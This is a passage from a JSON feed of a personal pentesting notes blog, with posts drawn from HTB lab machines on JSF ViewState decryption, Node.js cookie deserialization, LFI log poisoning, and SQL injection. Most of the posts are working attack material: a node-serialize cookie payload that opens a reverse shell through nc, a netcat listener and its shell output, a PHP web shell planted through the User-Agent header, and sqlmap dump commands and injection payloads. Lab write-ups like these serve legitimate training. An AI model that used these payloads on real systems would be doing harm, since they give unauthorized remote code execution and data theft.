class=\"nt\">&lt;/param-name&gt;</span><span class=\"nt\">&lt;param-value&gt;</span>SnNGOTg3Ni0=<span class=\"nt\">&lt;/param-value&gt;</span><span class=\"nt\">&lt;/context-param&gt;</span><span class=\"nt\">&lt;context-param&gt;</span></code></pre></div></div><ul>  <li>Here is an <a href=\"https://0xdf.gitlab.io/2019/08/10/htb-arkham.html#decrypt-viewstate\">example</a> encryption and decryption process using <code class=\"language-plaintext highlighter-rouge\">HmacSHA1</code></li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># encryption</span>payload -&gt; des_ecb_encrypt -&gt; hmac_sha1_sig -&gt; b64_encode -&gt; url_encode<span class=\"c\"># decryption</span>vs -&gt; url_decode -&gt; b64_decode -&gt; hmac_sha1_unsig -&gt; des_ecb_decrypt</code></pre></div></div><ul>  <li>Python3 decryption</li></ul><div class=\"language-python highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\"># initialize</span><span class=\"o\">&gt;&gt;&gt;</span> <span class=\"n\">vs</span> <span class=\"o\">=</span> <span class=\"s\">'wHo0wmLu5ceItIi%2BI7XkEi1GAb4h12WZ894pA%2BZ4OH7bco2jXEy1RQxTqLYuokmO70KtDtngjDm0mNzA9qHjYerxo0jW7zu1mdKBXtxnT1RmnWUWTJyCuNcJuxE%3D'</span><span class=\"c1\"># url_decode</span><span class=\"o\">&gt;&gt;&gt;</span> <span class=\"kn\">import</span> <span class=\"nn\">urllib</span><span class=\"o\">&gt;&gt;&gt;</span> <span class=\"n\">url_decoded</span> <span class=\"o\">=</span> <span class=\"n\">urllib</span><span class=\"p\">.</span><span class=\"n\">parse</span><span class=\"p\">.</span><span class=\"n\">unquote_plus</span><span class=\"p\">(</span><span class=\"n\">vs</span><span class=\"p\">)</span><span class=\"o\">&gt;&gt;&gt;</span> <span class=\"n\">url_decoded</span><span class=\"s\">'wHo0wmLu5ceItIi+I7XkEi1GAb4h12WZ894pA+Z4OH7bco2jXEy1RQxTqLYuokmO70KtDtngjDm0mNzA9qHjYerxo0jW7zu1mdKBXtxnT1RmnWUWTJyCuNcJuxE='</span><span class=\"o\">&gt;&gt;&gt;</span> <span class=\"c1\"># b64_decode</span><span class=\"o\">&gt;&gt;&gt;</span> <span class=\"kn\">import</span> <span class=\"nn\">base64</span><span class=\"o\">&gt;&gt;&gt;</span> <span class=\"n\">b64_decoded</span> <span class=\"o\">=</span> <span class=\"n\">base64</span><span class=\"p\">.</span><span class=\"n\">b64decode</span><span class=\"p\">(</span><span class=\"n\">url_decoded</span><span class=\"p\">)</span><span class=\"o\">&gt;&gt;&gt;</span> <span class=\"n\">b64_decoded</span><span class=\"sa\">b</span><span class=\"s\">'</span><span class=\"se\">\\xc0</span><span class=\"s\">z4</span><span class=\"se\">\\xc2</span><span class=\"s\">b</span><span class=\"se\">\\xee\\xe5\\xc7\\x88\\xb4\\x88\\xbe</span><span class=\"s\">#</span><span class=\"se\">\\xb5\\xe4\\x12</span><span class=\"s\">-F</span><span class=\"se\">\\x01\\xbe</span><span class=\"s\">!</span><span class=\"se\">\\xd7</span><span class=\"s\">e</span><span class=\"se\">\\x99\\xf3\\xde</span><span class=\"s\">)</span><span class=\"se\">\\x03\\xe6</span><span class=\"s\">x8~</span><span class=\"se\">\\xdb</span><span class=\"s\">r</span><span class=\"se\">\\x8d\\xa3\\\\</span><span class=\"s\">L</span><span class=\"se\">\\xb5</span><span class=\"s\">E</span><span class=\"se\">\\x0c</span><span class=\"s\">S</span><span class=\"se\">\\xa8\\xb6</span><span class=\"s\">.</span><span class=\"se\">\\xa2</span><span class=\"s\">I</span><span class=\"se\">\\x8e\\xef</span><span class=\"s\">B</span><span class=\"se\">\\xad\\x0e\\xd9\\xe0\\x8c</span><span class=\"s\">9</span><span class=\"se\">\\xb4\\x98\\xdc\\xc0\\xf6\\xa1\\xe3</span><span class=\"s\">a</span><span class=\"se\">\\xea\\xf1\\xa3</span><span class=\"s\">H</span><span class=\"se\">\\xd6\\xef</span><span class=\"s\">;</span><span class=\"se\">\\xb5\\x99\\xd2\\x81</span><span class=\"s\">^</span><span class=\"se\">\\xdc</span><span class=\"s\">gOTf</span><span class=\"se\">\\x9d</span><span class=\"s\">e</span><span class=\"se\">\\x16</span><span class=\"s\">L</span><span class=\"se\">\\x9c\\x82\\xb8\\xd7\\t\\xbb\\x11</span><span class=\"s\">'</span><span class=\"o\">&gt;&gt;&gt;</span> <span class=\"c1\"># hmac_sha1_unsig - separate message and tag (mac)#  tag     = last 20 bytes#  message = whole signature - last 20 bytes</span><span class=\"o\">&gt;&gt;&gt;</span> <span class=\"n\">t_bytes</span> <span class=\"o\">=</span> <span class=\"n\">b64_decoded</span><span class=\"p\">[</span><span class=\"o\">-</span><span class=\"mi\">20</span><span class=\"p\">:]</span><span class=\"o\">&gt;&gt;&gt;</span> <span class=\"n\">m_bytes</span> <span class=\"o\">=</span> <span class=\"n\">b64_decoded</span><span class=\"p\">[:</span><span class=\"o\">-</span><span class=\"mi\">20</span><span class=\"p\">]</span><span class=\"o\">&gt;&gt;&gt;</span> <span class=\"n\">t_bytes</span><span class=\"sa\">b</span><span class=\"s\">'</span><span class=\"se\">\\x99\\xd2\\x81</span><span class=\"s\">^</span><span class=\"se\">\\xdc</span><span class=\"s\">gOTf</span><span class=\"se\">\\x9d</span><span class=\"s\">e</span><span class=\"se\">\\x16</span><span class=\"s\">L</span><span class=\"se\">\\x9c\\x82\\xb8\\xd7\\t\\xbb\\x11</span><span class=\"s\">'</span><span class=\"o\">&gt;&gt;&gt;</span> <span class=\"n\">m_bytes</span><span class=\"sa\">b</span><span class=\"s\">'</span><span class=\"se\">\\xc0</span><span class=\"s\">z4</span><span class=\"se\">\\xc2</span><span class=\"s\">b</span><span class=\"se\">\\xee\\xe5\\xc7\\x88\\xb4\\x88\\xbe</span><span class=\"s\">#</span><span class=\"se\">\\xb5\\xe4\\x12</span><span class=\"s\">-F</span><span class=\"se\">\\x01\\xbe</span><span class=\"s\">!</span><span class=\"se\">\\xd7</span><span class=\"s\">e</span><span class=\"se\">\\x99\\xf3\\xde</span><span class=\"s\">)</span><span class=\"se\">\\x03\\xe6</span><span class=\"s\">x8~</span><span class=\"se\">\\xdb</span><span class=\"s\">r</span><span class=\"se\">\\x8d\\xa3\\\\</span><span class=\"s\">L</span><span class=\"se\">\\xb5</span><span class=\"s\">E</span><span class=\"se\">\\x0c</span><span class=\"s\">S</span><span class=\"se\">\\xa8\\xb6</span><span class=\"s\">.</span><span class=\"se\">\\xa2</span><span class=\"s\">I</span><span class=\"se\">\\x8e\\xef</span><span class=\"s\">B</span><span class=\"se\">\\xad\\x0e\\xd9\\xe0\\x8c</span><span class=\"s\">9</span><span class=\"se\">\\xb4\\x98\\xdc\\xc0\\xf6\\xa1\\xe3</span><span class=\"s\">a</span><span class=\"se\">\\xea\\xf1\\xa3</span><span class=\"s\">H</span><span class=\"se\">\\xd6\\xef</span><span class=\"s\">;</span><span class=\"se\">\\xb5</span><span class=\"s\">'</span><span class=\"o\">&gt;&gt;&gt;</span> <span class=\"c1\"># des_ecb_decrypt - here you see the actual java serialized# object which starts with \"\\xac\\xed\". It also includes the# URL path associated with the object which is:#   /userSubscribe.jsp</span><span class=\"o\">&gt;&gt;&gt;</span> <span class=\"kn\">from</span> <span class=\"nn\">Crypto.Cipher</span> <span class=\"kn\">import</span> <span class=\"n\">DES</span><span class=\"o\">&gt;&gt;&gt;</span> <span class=\"n\">k</span> <span class=\"o\">=</span> <span class=\"sa\">b</span><span class=\"s\">'JsF9876-'</span><span class=\"o\">&gt;&gt;&gt;</span> <span class=\"n\">crypter</span> <span class=\"o\">=</span> <span class=\"n\">DES</span><span class=\"p\">.</span><span class=\"n\">new</span><span class=\"p\">(</span><span class=\"n\">k</span><span class=\"p\">,</span> <span class=\"n\">DES</span><span class=\"p\">.</span><span class=\"n\">MODE_ECB</span><span class=\"p\">)</span><span class=\"o\">&gt;&gt;&gt;</span> <span class=\"n\">crypter</span><span class=\"p\">.</span><span class=\"n\">decrypt</span><span class=\"p\">(</span><span class=\"n\">m_bytes</span><span class=\"p\">)</span><span class=\"sa\">b</span><span class=\"s\">'</span><span class=\"se\">\\xac\\xed\\x00\\x05</span><span class=\"s\">ur</span><span class=\"se\">\\x00\\x13</span><span class=\"s\">[Ljava.lang.Object;</span><span class=\"se\">\\x90\\xce</span><span class=\"s\">X</span><span class=\"se\">\\x9f\\x10</span><span class=\"s\">s)l</span><span class=\"se\">\\x02\\x00\\x00</span><span class=\"s\">xp</span><span class=\"se\">\\x00\\x00\\x00\\x03</span><span class=\"s\">t</span><span class=\"se\">\\x00\\x01</span><span class=\"s\">1pt</span><span class=\"se\">\\x00\\x12</span><span class=\"s\">/userSubscribe.jsp</span><span class=\"se\">\\x02\\x02</span><span class=\"s\">'</span><span class=\"o\">&gt;&gt;&gt;</span> </code></pre></div></div><h2 id=\"tools\">Tools</h2><ul>  <li><a href=\"http://viewstatedecoder.azurewebsites.net/\">Online viewstate decoder</a></li></ul><h2 id=\"references\">References</h2><ul>  <li><a href=\"https://book.hacktricks.xyz/pentesting-web/deserialization/java-jsf-viewstate-.faces-deserialization\">Hacktricks - JSF Deserialization</a></li>  <li><a href=\"https://www.synacktiv.com/ressources/JSF_ViewState_InYourFace.pdf\">JSF ViewState upside-down</a></li>  <li><a href=\"https://dhiyaneshgeek.github.io/web/security/2021/05/08/demystifying-insecure-deserialisation-on-JSF-application/\">Demystifying Insecure Deserialisation on JSF Application</a></li>  <li><a href=\"https://cwiki.apache.org/confluence/display/MYFACES2/Secure+Your+Application\">Secure Your Application - MYFACES2 - Apache Software Foundation</a></li>  <li>HTB Arkham</li></ul>",
            "url": "https://mvineza.github.io/spindel/2022/04/05/java-jsf-viewstate-deserialization",
            
            
            
            "tags": ["java","deserialization","foothold"],
            
            "date_published": "2022-04-05T00:00:00+08:00",
            "date_modified": "2022-04-05T00:00:00+08:00",
            
                "author":  {
                "name": "spindel",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://mvineza.github.io/spindel/2022/04/04/node-js-deserialization-cookie",
            "title": "Node JS Deserialization - Cookie",
            "summary": "Node JS Deserialization - Cookie",
            "content_text": "OverviewAttacker can obtain RCE by injecting malicious javascript payload on cookies using eval() method.Environment Setup  Vulnerable app provides base64 encoded cookieSteps  Verify that app is vulnerable to [[Insecure Deserialization]] by manipulating the cookie  Open netcat listener on attacker machine and generate nodejs reverse shell➜  celestial python2 ~/data/tools/webapp/nodejsshell.py 10.10.14.13 4444[+] LHOST = 10.10.14.13[+] LPORT = 4444[+] Encodingeval(String.fromCharCode(10,118,97,114,32,110,101,116,32,61,32[...redacted...],14,44,80,79,82,84,41,59,10))➜  celestial  Construct the payload by copying the generated eval() statement from command above to username variable of cookie# this will put the base64 encoded output to your clipboardecho -n '{\"username\":\"_$$ND_FUNC$$_function (){eval(String.fromCharCode(10,118,97,114,32,110,101,116,32,61,3[...redacted...]184,44,80,79,82,84,41,59,10))}()\",\"country\":\"rce\",\"city\":\"rce\",\"num\":\"100\"}' | base64 -w0 | xclip -selection clipboard  Paste the cookie in burp and wait for reverse shell connection➜  celestial rlwrap nc -nvlp 4444listening on [any] 4444 ...connect to [10.10.14.13] from (UNKNOWN) [10.10.10.85] 56596Connected!iduid=1000(sun) gid=1000(sun) groups=1000(sun),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)Alternatives  Another payload you can use is via child_process module{\"username\":\"_$$ND_FUNC$$_require('child_process').exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.8 1234 &gt;/tmp/f', function(error, stdout, stderr) { console.log(stdout) })\",\"country\":\"Lameville\",\"city\":\"Lametown\",\"num\":\"2\"}Application CodeHere is the vulnerable app.var express = require('express');var cookieParser = require('cookie-parser');var escape = require('escape-html');var serialize = require('node-serialize');var app = express();app.use(cookieParser()) app.get('/', function(req, res) { if (req.cookies.profile) {   var str = new Buffer(req.cookies.profile, 'base64').toString();   // Vulnerable part of code   var obj = serialize.unserialize(str);   if (obj.username) {      var sum = eval(obj.num + obj.num);     res.send(\"Hey \" + obj.username + \" \" + obj.num + \" + \" + obj.num + \" is \" + sum);   }else{     res.send(\"An error occurred...invalid username type\");    }}else {     res.cookie('profile', \"eyJ1c2VybmFtZSI6IkR1bW15IiwiY291bnRyeSI6IklkayBQcm9iYWJseSBTb21ld2hlcmUgRHVtYiIsImNpdHkiOiJMYW1ldG93biIsIm51bSI6IjIifQ==\", {       maxAge: 900000,       httpOnly: true     }); } res.send(\"&lt;h1&gt;404&lt;/h1&gt;\");});app.listen(3000);Reference  HTB Celestial",
            "content_html": "<h2 id=\"overview\">Overview</h2><p>Attacker can obtain RCE by injecting malicious javascript payload on cookies using <code class=\"language-plaintext highlighter-rouge\">eval()</code> method.</p><h2 id=\"environment-setup\">Environment Setup</h2><ul>  <li>Vulnerable app provides base64 encoded cookie</li></ul><p><img src=\"/spindel/assets/Node%20JS%20Deserialization%20-%20Cookie/F384E27F-729C-441E-AB46-6202061374F3.png\" alt=\"\" /></p><h2 id=\"steps\">Steps</h2><ul>  <li>Verify that app is vulnerable to [[Insecure Deserialization]] by manipulating the cookie</li></ul><p><img src=\"/spindel/assets/Node%20JS%20Deserialization%20-%20Cookie/05887E32-3C3F-4611-8183-95D109A19F19.png\" alt=\"\" /></p><ul>  <li>Open netcat listener on attacker machine and generate <a href=\"https://github.com/ajinabraham/Node.Js-Security-Course/blob/master/nodejsshell.py\">nodejs reverse shell</a></li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>➜  celestial python2 ~/data/tools/webapp/nodejsshell.py 10.10.14.13 4444<span class=\"o\">[</span>+] LHOST <span class=\"o\">=</span> 10.10.14.13<span class=\"o\">[</span>+] LPORT <span class=\"o\">=</span> 4444<span class=\"o\">[</span>+] Encoding<span class=\"nb\">eval</span><span class=\"o\">(</span>String.fromCharCode<span class=\"o\">(</span>10,118,97,114,32,110,101,116,32,61,32[...redacted...],14,44,80,79,82,84,41,59,10<span class=\"o\">))</span>➜  celestial</code></pre></div></div><ul>  <li>Construct the payload by copying the generated <code class=\"language-plaintext highlighter-rouge\">eval()</code> statement from command above to <code class=\"language-plaintext highlighter-rouge\">username</code> variable of cookie</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># this will put the base64 encoded output to your clipboard</span><span class=\"nb\">echo</span> <span class=\"nt\">-n</span> <span class=\"s1\">'{\"username\":\"_$$ND_FUNC$$_function (){eval(String.fromCharCode(10,118,97,114,32,110,101,116,32,61,3[...redacted...]184,44,80,79,82,84,41,59,10))}()\",\"country\":\"rce\",\"city\":\"rce\",\"num\":\"100\"}'</span> | <span class=\"nb\">base64</span> <span class=\"nt\">-w0</span> | xclip <span class=\"nt\">-selection</span> clipboard</code></pre></div></div><ul>  <li>Paste the cookie in burp and wait for reverse shell connection</li></ul><p><img src=\"/spindel/assets/Node%20JS%20Deserialization%20-%20Cookie/9E4C6140-18E9-4211-9E1C-7F324D8C029F.png\" alt=\"\" /></p><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>➜  celestial rlwrap nc <span class=\"nt\">-nvlp</span> 4444listening on <span class=\"o\">[</span>any] 4444 ...connect to <span class=\"o\">[</span>10.10.14.13] from <span class=\"o\">(</span>UNKNOWN<span class=\"o\">)</span> <span class=\"o\">[</span>10.10.10.85] 56596Connected!<span class=\"nb\">id</span><span class=\"nv\">uid</span><span class=\"o\">=</span>1000<span class=\"o\">(</span>sun<span class=\"o\">)</span> <span class=\"nv\">gid</span><span class=\"o\">=</span>1000<span class=\"o\">(</span>sun<span class=\"o\">)</span> <span class=\"nb\">groups</span><span class=\"o\">=</span>1000<span class=\"o\">(</span>sun<span class=\"o\">)</span>,4<span class=\"o\">(</span>adm<span class=\"o\">)</span>,24<span class=\"o\">(</span>cdrom<span class=\"o\">)</span>,27<span class=\"o\">(</span><span class=\"nb\">sudo</span><span class=\"o\">)</span>,30<span class=\"o\">(</span>dip<span class=\"o\">)</span>,46<span class=\"o\">(</span>plugdev<span class=\"o\">)</span>,113<span class=\"o\">(</span>lpadmin<span class=\"o\">)</span>,128<span class=\"o\">(</span>sambashare<span class=\"o\">)</span></code></pre></div></div><h2 id=\"alternatives\">Alternatives</h2><ul>  <li>Another payload you can use is via <code class=\"language-plaintext highlighter-rouge\">child_process</code> module</li></ul><div class=\"language-plaintext highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>{\"username\":\"_$$ND_FUNC$$_require('child_process').exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.8 1234 &gt;/tmp/f', function(error, stdout, stderr) { console.log(stdout) })\",\"country\":\"Lameville\",\"city\":\"Lametown\",\"num\":\"2\"}</code></pre></div></div><h2 id=\"application-code\">Application Code</h2><p>Here is the vulnerable app.</p><div class=\"language-javascript highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"kd\">var</span> <span class=\"nx\">express</span> <span class=\"o\">=</span> <span class=\"nx\">require</span><span class=\"p\">(</span><span class=\"dl\">'</span><span class=\"s1\">express</span><span class=\"dl\">'</span><span class=\"p\">);</span><span class=\"kd\">var</span> <span class=\"nx\">cookieParser</span> <span class=\"o\">=</span> <span class=\"nx\">require</span><span class=\"p\">(</span><span class=\"dl\">'</span><span class=\"s1\">cookie-parser</span><span class=\"dl\">'</span><span class=\"p\">);</span><span class=\"kd\">var</span> <span class=\"nx\">escape</span> <span class=\"o\">=</span> <span class=\"nx\">require</span><span class=\"p\">(</span><span class=\"dl\">'</span><span class=\"s1\">escape-html</span><span class=\"dl\">'</span><span class=\"p\">);</span><span class=\"kd\">var</span> <span class=\"nx\">serialize</span> <span class=\"o\">=</span> <span class=\"nx\">require</span><span class=\"p\">(</span><span class=\"dl\">'</span><span class=\"s1\">node-serialize</span><span class=\"dl\">'</span><span class=\"p\">);</span><span class=\"kd\">var</span> <span class=\"nx\">app</span> <span class=\"o\">=</span> <span class=\"nx\">express</span><span class=\"p\">();</span><span class=\"nx\">app</span><span class=\"p\">.</span><span class=\"nx\">use</span><span class=\"p\">(</span><span class=\"nx\">cookieParser</span><span class=\"p\">())</span> <span class=\"nx\">app</span><span class=\"p\">.</span><span class=\"kd\">get</span><span class=\"p\">(</span><span class=\"dl\">'</span><span class=\"s1\">/</span><span class=\"dl\">'</span><span class=\"p\">,</span> <span class=\"kd\">function</span><span class=\"p\">(</span><span class=\"nx\">req</span><span class=\"p\">,</span> <span class=\"nx\">res</span><span class=\"p\">)</span> <span class=\"p\">{</span> <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"nx\">req</span><span class=\"p\">.</span><span class=\"nx\">cookies</span><span class=\"p\">.</span><span class=\"nx\">profile</span><span class=\"p\">)</span> <span class=\"p\">{</span>   <span class=\"kd\">var</span> <span class=\"nx\">str</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"nx\">Buffer</span><span class=\"p\">(</span><span class=\"nx\">req</span><span class=\"p\">.</span><span class=\"nx\">cookies</span><span class=\"p\">.</span><span class=\"nx\">profile</span><span class=\"p\">,</span> <span class=\"dl\">'</span><span class=\"s1\">base64</span><span class=\"dl\">'</span><span class=\"p\">).</span><span class=\"nx\">toString</span><span class=\"p\">();</span>   <span class=\"c1\">// Vulnerable part of code</span>   <span class=\"kd\">var</span> <span class=\"nx\">obj</span> <span class=\"o\">=</span> <span class=\"nx\">serialize</span><span class=\"p\">.</span><span class=\"nx\">unserialize</span><span class=\"p\">(</span><span class=\"nx\">str</span><span class=\"p\">);</span>   <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"nx\">obj</span><span class=\"p\">.</span><span class=\"nx\">username</span><span class=\"p\">)</span> <span class=\"p\">{</span>      <span class=\"kd\">var</span> <span class=\"nx\">sum</span> <span class=\"o\">=</span> <span class=\"nb\">eval</span><span class=\"p\">(</span><span class=\"nx\">obj</span><span class=\"p\">.</span><span class=\"nx\">num</span> <span class=\"o\">+</span> <span class=\"nx\">obj</span><span class=\"p\">.</span><span class=\"nx\">num</span><span class=\"p\">);</span>     <span class=\"nx\">res</span><span class=\"p\">.</span><span class=\"nx\">send</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">Hey </span><span class=\"dl\">\"</span> <span class=\"o\">+</span> <span class=\"nx\">obj</span><span class=\"p\">.</span><span class=\"nx\">username</span> <span class=\"o\">+</span> <span class=\"dl\">\"</span><span class=\"s2\"> </span><span class=\"dl\">\"</span> <span class=\"o\">+</span> <span class=\"nx\">obj</span><span class=\"p\">.</span><span class=\"nx\">num</span> <span class=\"o\">+</span> <span class=\"dl\">\"</span><span class=\"s2\"> + </span><span class=\"dl\">\"</span> <span class=\"o\">+</span> <span class=\"nx\">obj</span><span class=\"p\">.</span><span class=\"nx\">num</span> <span class=\"o\">+</span> <span class=\"dl\">\"</span><span class=\"s2\"> is </span><span class=\"dl\">\"</span> <span class=\"o\">+</span> <span class=\"nx\">sum</span><span class=\"p\">);</span>   <span class=\"p\">}</span><span class=\"k\">else</span><span class=\"p\">{</span>     <span class=\"nx\">res</span><span class=\"p\">.</span><span class=\"nx\">send</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">An error occurred...invalid username type</span><span class=\"dl\">\"</span><span class=\"p\">);</span>    <span class=\"p\">}</span><span class=\"p\">}</span><span class=\"k\">else</span> <span class=\"p\">{</span>     <span class=\"nx\">res</span><span class=\"p\">.</span><span class=\"nx\">cookie</span><span class=\"p\">(</span><span class=\"dl\">'</span><span class=\"s1\">profile</span><span class=\"dl\">'</span><span class=\"p\">,</span> <span class=\"dl\">\"</span><span class=\"s2\">eyJ1c2VybmFtZSI6IkR1bW15IiwiY291bnRyeSI6IklkayBQcm9iYWJseSBTb21ld2hlcmUgRHVtYiIsImNpdHkiOiJMYW1ldG93biIsIm51bSI6IjIifQ==</span><span class=\"dl\">\"</span><span class=\"p\">,</span> <span class=\"p\">{</span>       <span class=\"na\">maxAge</span><span class=\"p\">:</span> <span class=\"mi\">900000</span><span class=\"p\">,</span>       <span class=\"na\">httpOnly</span><span class=\"p\">:</span> <span class=\"kc\">true</span>     <span class=\"p\">});</span> <span class=\"p\">}</span> <span class=\"nx\">res</span><span class=\"p\">.</span><span class=\"nx\">send</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">&lt;h1&gt;404&lt;/h1&gt;</span><span class=\"dl\">\"</span><span class=\"p\">);</span><span class=\"p\">});</span><span class=\"nx\">app</span><span class=\"p\">.</span><span class=\"nx\">listen</span><span class=\"p\">(</span><span class=\"mi\">3000</span><span class=\"p\">);</span></code></pre></div></div><h2 id=\"reference\">Reference</h2><ul>  <li><a href=\"https://www.youtube.com/watch?v=aS6z4NgRysU\">HTB Celestial</a></li></ul>",
            "url": "https://mvineza.github.io/spindel/2022/04/04/node-js-deserialization-cookie",
            
            
            
            "tags": ["nodejs","deserialization","foothold"],
            
            "date_published": "2022-04-04T00:00:00+08:00",
            "date_modified": "2022-04-04T00:00:00+08:00",
            
                "author":  {
                "name": "spindel",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://mvineza.github.io/spindel/2022/04/03/lfi-using-access-logs-log-poisoning",
            "title": "LFI - Using access logs (Log Poisoning)",
            "summary": "LFI - Using access logs (Log Poisoning)",
            "content_text": "Steps  Ensure you can do LFI on access logs  Insert this on useragent parameter&lt;?php echo shell_exec($_GET['cmd']);?&gt;  Include the logs on next requestcurl 'http://10.10.8.194/?view=../../../../var/log/apache2/access.log&amp;ext=&amp;cmd=whoami'            reference: [Remote Code Execution With LFI      C:\\Helich0pper](https://helich0pper.github.io/LFI/)      References  HTB bart",
            "content_html": "<h2 id=\"steps\">Steps</h2><ul>  <li>Ensure you can do LFI on access logs</li>  <li>Insert this on useragent parameter</li></ul><div class=\"language-plaintext highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>&lt;?php echo shell_exec($_GET['cmd']);?&gt;</code></pre></div></div><p><img src=\"/spindel/assets/LFI%20-%20Using%20access%20logs%20(Log%20Poisoning)/burp-changing-user-agent.png\" alt=\"\" /></p><ul>  <li>Include the logs on next request</li></ul><div class=\"language-plaintext highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>curl 'http://10.10.8.194/?view=../../../../var/log/apache2/access.log&amp;ext=&amp;cmd=whoami'</code></pre></div></div><table>  <tbody>    <tr>      <td>reference: [Remote Code Execution With LFI</td>      <td>C:\\Helich0pper](https://helich0pper.github.io/LFI/)</td>    </tr>  </tbody></table><h2 id=\"references\">References</h2><ul>  <li>HTB bart</li></ul>",
            "url": "https://mvineza.github.io/spindel/2022/04/03/lfi-using-access-logs-log-poisoning",
            
            
            
            "tags": ["web","lfi","php"],
            
            "date_published": "2022-04-03T00:00:00+08:00",
            "date_modified": "2022-04-03T00:00:00+08:00",
            
                "author":  {
                "name": "spindel",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://mvineza.github.io/spindel/2022/04/03/complicated-sql-payloads",
            "title": "Complicated SQL Payloads",
            "summary": "Complicated SQL Payloads",
            "content_text": "HTB Europa - 302 RedirectSuccessful SQL injection leads to 302 redirect.I was unable to enumerate database except by using sqlmap.sqlmap --proxy=http://127.0.0.1:8080 -r req.txt --batch --dbms=mysql -p email --dump -D adminHTB Enterprise - Double Query Error-based Injection[13:12:29] [INFO] testing connection to the target URLsqlmap resumed the following injection point(s) from stored session:---Parameter: query (GET)    Type: boolean-based blind    Title: Boolean-based blind - Parameter replace (original value)    Payload: query=(SELECT (CASE WHEN (7210=7210) THEN 1 ELSE (SELECT 5043 UNION SELECT 6730) END))    Type: error-based    Title: MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)    Payload: query=1 AND (SELECT 2881 FROM(SELECT COUNT(*),CONCAT(0x71626a6b71,(SELECT (ELT(2881=2881,1))),0x716b716b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)    Type: time-based blind    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)    Payload: query=1 AND (SELECT 1004 FROM (SELECT(SLEEP(5)))OoNX)---[13:12:29] [INFO] the back-end DBMS is MySQL                              [HTB: Enterprise          0xdf hacks stuff - Double Query Error-based Injection](https://0xdf.gitlab.io/2021/06/16/htb-enterprise.html#beyond-root—error-based-sqli)                      HTB Enterprise by IppsecHTB Unattended nested SQL InjectionThis box is tough, I haven’t understand fully this technique but I will put it here for reference.",
            "content_html": "<h2 id=\"htb-europa---302-redirect\">HTB Europa - 302 Redirect</h2><p>Successful SQL injection leads to 302 redirect.</p><p><img src=\"/spindel/assets/Complicated%20SQL%20Payloads/A34CC184-43B7-4D71-A1CB-CA737FBB1CEE.png\" alt=\"\" /></p><p>I was unable to enumerate database except by using sqlmap.</p><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>sqlmap <span class=\"nt\">--proxy</span><span class=\"o\">=</span>http://127.0.0.1:8080 <span class=\"nt\">-r</span> req.txt <span class=\"nt\">--batch</span> <span class=\"nt\">--dbms</span><span class=\"o\">=</span>mysql <span class=\"nt\">-p</span> email <span class=\"nt\">--dump</span> <span class=\"nt\">-D</span> admin</code></pre></div></div><h2 id=\"htb-enterprise---double-query-error-based-injection\">HTB Enterprise - Double Query Error-based Injection</h2><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"o\">[</span>13:12:29] <span class=\"o\">[</span>INFO] testing connection to the target URLsqlmap resumed the following injection point<span class=\"o\">(</span>s<span class=\"o\">)</span> from stored session:<span class=\"nt\">---</span>Parameter: query <span class=\"o\">(</span>GET<span class=\"o\">)</span>    Type: boolean-based blind    Title: Boolean-based blind - Parameter replace <span class=\"o\">(</span>original value<span class=\"o\">)</span>    Payload: <span class=\"nv\">query</span><span class=\"o\">=(</span>SELECT <span class=\"o\">(</span>CASE WHEN <span class=\"o\">(</span><span class=\"nv\">7210</span><span class=\"o\">=</span>7210<span class=\"o\">)</span> THEN 1 ELSE <span class=\"o\">(</span>SELECT 5043 UNION SELECT 6730<span class=\"o\">)</span> END<span class=\"o\">))</span>    Type: error-based    Title: MySQL <span class=\"o\">&gt;=</span> 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause <span class=\"o\">(</span>FLOOR<span class=\"o\">)</span>    Payload: <span class=\"nv\">query</span><span class=\"o\">=</span>1 AND <span class=\"o\">(</span>SELECT 2881 FROM<span class=\"o\">(</span>SELECT COUNT<span class=\"o\">(</span><span class=\"k\">*</span><span class=\"o\">)</span>,CONCAT<span class=\"o\">(</span>0x71626a6b71,<span class=\"o\">(</span>SELECT <span class=\"o\">(</span>ELT<span class=\"o\">(</span><span class=\"nv\">2881</span><span class=\"o\">=</span>2881,1<span class=\"o\">)))</span>,0x716b716b71,FLOOR<span class=\"o\">(</span>RAND<span class=\"o\">(</span>0<span class=\"o\">)</span><span class=\"k\">*</span>2<span class=\"o\">))</span>x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x<span class=\"o\">)</span>a<span class=\"o\">)</span>    Type: time-based blind    Title: MySQL <span class=\"o\">&gt;=</span> 5.0.12 AND time-based blind <span class=\"o\">(</span>query SLEEP<span class=\"o\">)</span>    Payload: <span class=\"nv\">query</span><span 